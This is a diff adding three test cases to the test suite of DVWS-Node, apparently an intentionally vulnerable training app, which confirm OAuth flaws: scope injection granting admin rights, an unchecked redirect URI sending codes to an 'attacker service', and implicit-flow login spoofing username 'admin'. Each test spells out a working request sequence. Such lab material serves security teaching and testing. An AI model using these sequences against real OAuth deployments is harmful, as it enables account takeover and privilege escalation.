@@ -485,4 +485,131 @@ describe("DVWS-Node Vulnerability Tests", function () {
       expect(response.status).to.not.equal(429, "Rate limit should be bypassed with new IP");
     });
   });
+
+  describe("37. OAuth Scope Upgrade (Privilege Escalation)", function () {
+    it("should allow becoming admin by adding dvws:admin scope", async function () {
+      // 1. Login to Provider to get session cookie
+      // We use the full URL to hit the provider exposed on localhost:5000
+      const providerReq = require("supertest")("http://localhost:5000");
+      
+      const loginRes = await providerReq
+        .post("/login")
+        .type('form')
+        .send({ username: "attacker_" + Date.now(), email: "attacker@test.com" });
+        
+      const cookies = loginRes.headers['set-cookie'];
+      expect(cookies).to.exist;
+
+      // 2. Authorize with malicious scope
+      const authRes = await providerReq
+        .get("/authorize")
+        .set('Cookie', cookies)
+        .query({
+            client_id: 'dvws-client',
+            redirect_uri: 'http://localhost:80/api/v2/auth/callback',
+            response_type: 'code',
+            scope: 'openid dvws:admin', // MALICIOUS SCOPE
+            confirm: 'true' // Bypass consent
+        });
+        
+      expect(authRes.status).to.eql(302);
+      const redirectLocation = authRes.headers['location'];
+      const code = new URL(redirectLocation).searchParams.get('code');
+      expect(code).to.exist;
+
+      // 3. Callback to DVWS
+      const callbackRes = await request
+        .get("/auth/callback")
+        .query({ code: code });
+        
+      expect(callbackRes.status).to.eql(200);
+      
+      // Extract token from the response body
+      const match = callbackRes.text.match(/localStorage\.setItem\('JWTSessionID', '([^']+)'\)/);
+      expect(match).to.exist;
+      const token = match[1];
+      
+      // 4. Verify Admin Access
+      const adminCheck = await request
+        .get("/users/checkadmin")
+        .set('Authorization', 'Bearer ' + token);
+        
+      expect(adminCheck.body.Success).to.include("User is Admin");
+    });
+  });
+
+  describe("38. OAuth Weak Redirect URI (Open Redirect / Token Leakage)", function () {
+    it("should allow redirecting to localhost port 6666 (Attacker Service)", async function () {
+      const providerReq = require("supertest")("http://localhost:5000");
+      
+      // Login first
+      const loginRes = await providerReq
+        .post("/login")
+        .type('form')
+        .send({ username: "victim", email: "victim@test.com" });
+      const cookies = loginRes.headers['set-cookie'];
+
+      // Attempt redirect to attacker service
+      const attackerUri = "http://localhost:6666/callback";
+      
+      const authRes = await providerReq
+        .get("/authorize")
+        .set('Cookie', cookies)
+        .query({
+            client_id: 'dvws-client',
+            redirect_uri: attackerUri, // Malicious URI
+            response_type: 'code',
+            scope: 'openid',
+            confirm: 'true'
+        });
+        
+      expect(authRes.status).to.eql(302);
+      expect(authRes.headers['location']).to.include(attackerUri);
+    });
+  });
+
+  describe("39. Implicit Flow Authentication Bypass", function () {
+    it("should allow login as admin by supplying valid token and username=admin", async function () {
+      const providerReq = require("supertest")("http://localhost:5000");
+      
+      // 1. Login to Provider as attacker
+      const loginRes = await providerReq
+        .post("/login")
+        .type('form')
+        .send({ username: "attacker", email: "attacker@test.com" });
+      const cookies = loginRes.headers['set-cookie'];
+
+      // 2. Get Access Token (Implicit Flow)
+      const authRes = await providerReq
+        .get("/authorize")
+        .set('Cookie', cookies)
+        .query({
+            client_id: 'dvws-client',
+            redirect_uri: 'http://localhost',
+            response_type: 'token',
+            scope: 'openid',
+            confirm: 'true'
+        });
+        
+      expect(authRes.status).to.eql(302);
+      const redirectLocation = authRes.headers['location'];
+      
+      const hashPart = redirectLocation.split('#')[1];
+      const params = new URLSearchParams(hashPart);
+      const accessToken = params.get('access_token');
+      expect(accessToken).to.exist;
+
+      // 3. Exploit: Send token + username=admin
+      const exploitRes = await request
+        .post("/login/implicit")
+        .send({
+            access_token: accessToken,
+            username: "admin" // Spoofing target
+        });
+        
+      expect(exploitRes.status).to.eql(200);
+      expect(exploitRes.body.username).to.eql("admin");
+      expect(exploitRes.body.token).to.exist;
+    });
+  });
 });
